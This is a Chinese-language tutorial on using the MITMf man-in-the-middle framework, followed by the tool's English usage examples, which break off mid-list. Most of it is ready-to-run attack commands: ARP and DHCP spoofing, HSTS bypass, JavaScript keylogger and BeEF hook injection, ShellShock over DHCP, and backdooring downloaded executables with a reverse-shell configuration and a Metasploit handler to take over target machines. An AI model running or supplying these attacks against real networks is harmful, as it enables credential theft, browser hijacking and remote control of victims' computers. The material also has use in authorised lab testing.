## MITMF使用：

工具有几项基本功能：

```
sslstrip
　　部分绕过HSTS，这个不用多说。默认是开启的状态
Filepwn
　　主要作用是当被欺骗对象尝试下载文件时，首先对文件进行分析，对可执行文件（PE、ELF）进行后门注入，然后再给到被欺骗对象
Cachekill
　　清空客户端的缓存缓冲池，这个在我们需要重新注入一段js时是很有用的。这个功能还是非常有用的。
Spoof
　　欺骗模块。当我们使用MITM功能攻击欺骗时绝对是不能缺少的。其主要包括对ARP、ICMP、DHCP进行流量重定向（三种模式不能同时使用）
BeEFAutorun
　　该模块可以使框架可以连接到BeEF，将MITM与浏览器渗透结合起来
Replace
　　可以对浏览内容进行替换，支持正则表达式。注意，这里模块默认情况下是强制刷新缓存缓冲池的，要想不改变缓冲内容，需要手动指定keep-cache参数
Inject 
　　可以向被欺骗者的浏览内容中注入各种猥琐的东西，比如js，html，图片，电影。
Browser Profiler
　　枚举被欺骗机器的浏览器插件。对于前期的信息收集阶段还是很有用的。
JavaPwn 
　　可以通过向被攻击机器中注入jar使得浏览内容被毒化，和metasploit联合可以直接渗透机器拿到shell
Javascript Keylogger 
　　一个键盘记录js
App Cache Poison 
　　app缓存投毒。对于网页应用程序进行毒化处理，然后进行随心所欲的攻击。是Krzysztof Kotowicz的补充模块。
Upsidedownternet
　　恶搞模块，让浏览者的世界翻转。
RedirectsBrowserProfiler 
　　这个插件可以检测目标的浏览器类型，这将有助于识别漏洞
HTA Drive-By
　　注入一个假的更新通知，并提示客户下载一个HTA应用
AppCachePoison 
　　执行HTML5的App-缓存中毒攻击
BrowserSniper 
　　执行与外的最新浏览器插件在客户端上HTA Drive-by攻击
.......
```

 

**使用举例**

嗅探SSL传输的数据包
-a参数表示对http和https的数据包都嗅探

```
python mitmf.py -i eth0 --hsts --spoof --arp --gateway 10.0.0.1 --target 10.0.0.18
```

绕过HSTS站点抓取登陆明文可以参考：http://www.cnblogs.com/yaseng/p/hsts-bypass-with-mitmf.html

 

对图片进行替换

```
root@ET:/usr/local/bin/MITMf# 
python mitmf.py --spoof --arp -i eth0 --gateway 10.3.138.1 --target 10.3.138.5 --imgrand --img-dir /root/MITMf/Photo       
```



Screenshotter模块
对目标浏览器进行截屏

```
python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.100 --screen
```

恶搞功能: 它可以使目标浏览网页时，所有的图片都倒转 180度。

```
mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.100 --upsidedownternet
```

Inject模块的注入功能

```
注入html Iframe 框架 (指向网址:http://www.freebuf.com）：
mitmf -i eth0 --spoof --arp --gateway 192.168.1.2 --target 192.168.1.129 --inject --html-url http://www.freebuf.com

注入js：
mitmf -i eth0 --spoof --arp --gateway 192.168.1.2 --target 192.168.1.129 --inject --js-url http://linvex.xxx.cn/test.js

键盘记录js:
mitmf -i eth0 --spoof –-arp  –-gateway 192.168.1.1 –-target 192.168.1.114 --jskeylogger
```

关于js攻击*，*大家可以参考EtherDream同学的JS缓存投毒的文章

最后再看一下“破壳”是如何在DHCP中起作用的

```
mitmf.py -i eth0 --spoof --dhcp --shellshock
```

 

三. 高级玩法**(1)与Beef配合使用**
运行 beef 来调用 beef 的 hook 脚本： cd /usr/share/beef-xss && ./beef
我们可以在启动界面找到 hook 脚本的地址和 UI界面的地址
在浏览器打开UI界面后，下面我们就用 mitmf 进行中间人攻击。输入如下命令:

```
mitmf --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.114 --inject –js-url http://192.168.1.110:3000/hook.js
```

原理是： 利用ARP进行地址欺骗，让局域网中的其他电脑，误认为Kali为网关路由。
当目标机器打开；浏览器，就会被注入 hook 脚本。之后便可在beef上进行客户端的控制。
我们可以在另一台实验机器上进行查看，验证下Mac地址是否已经更改。
当目标打开浏览器进行访问时，我们可以在beef的UI客户端上看到目标的已经成功被 hook.
在那台实验机器上，利用审查元素功能进行源码查看。我们可以看到hook 脚本已经被注入

**(2)利用java漏洞进行攻击**
使用的是javapwn模块。
这个模块事实上就是根据客户端的java版本从msf挑出攻击payload进行溢出渗透攻击的过程，
只不过是将注入的过程加入到了ARP欺骗的过程而不是之前演示的那种直接给客户端一个url，使得攻击更为自然。
将metasploit打开，然后载入msgrpc模块： msf > load msgrpc Pass=abc123
其他部分保持默认就好了。然后是MITMf端，输入以下命令：

```
mitmf -i eth0 --spoof --gateway 192.168.217.2 --target 192.168.217.129 --javapwn --msfip 192.168.1.100
```

然后我们就只需要等待就可以了，这个过程我们可以看到靶机所浏览的一些网站记录同时我们也能接收到一些毒化html的反馈信息。
如果顺利，我们的jar就被执行了。

**(3)为PE文件注入后门实现渗透**
使用Filepwn模块，与msf结合同样可以获得shell。
Filepwn的原理：ARP过程中如果探测到靶机有下载的活动，便劫持下载链接，首先将文件下载下来进行解包分析，如果是可执行文件就尝试注入后门，如果失败则重新打包。最后将文件输出给靶机由靶机进行下载。这里的文档支持 zip和tar.gz格式解包，支持各种可执行文件。
同样我们打开metasploit，使用handler，开始监听：

```
msfconsole
use exploit/multi/handler
set LHOST 192.168.217.137
set LPORT 1447
run
```

在使用MITMf前我们需要对配置文件进行配置，注入信息配置如下（只列出作用位置）

```
…………SNIP…………
[[[WindowsIntelx86]]]        
PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND        
HOST = 192.168.1.100        
PORT = 4444        
SHELL = reverse_shell_tcp        
SUPPLIED_SHELLCODE = None        
ZERO_CERT = False        
PATCH_DLL = True        
MSFPAYLOAD = windows/shell_reverse_tcp
…………SNIP…………
```

接下来是MITMf：

```
./mitmf.py --iface eth0 --spoof --gateway 192.168.1.1 --target 192.168.1.200 --filepwn
```

然后就是等待靶机下载文件然后执行就可以了。
最后我们的靶机执行了文件，然后msf获得到了shell。
***************************************************************************

https://github.com/byt3bl33d3r/MITMf
Examples

```
The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface enp3s0:
python mitmf.py -i enp3s0

ARP poison the whole subnet with the gateway at 192.168.1.1 using the Spoof plugin:

python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1

Same as above + a WPAD rogue proxy server using the Responder plugin:

python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --responder --wpad

ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:

python mitmf.py -i enp3s0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1

Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):

python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1

Enable LLMNR/NBTNS/MDNS spoofing:

python mitmf.py -i enp3s0 --responder --wredir --nbtns

Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):

python mitmf.py -i enp3s0 --spoof --dhcp

Same as above with a ShellShock payload that will be executed if any client is vulnerable:

python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'

Inject an HTML IFrame using the Inject plugin:
```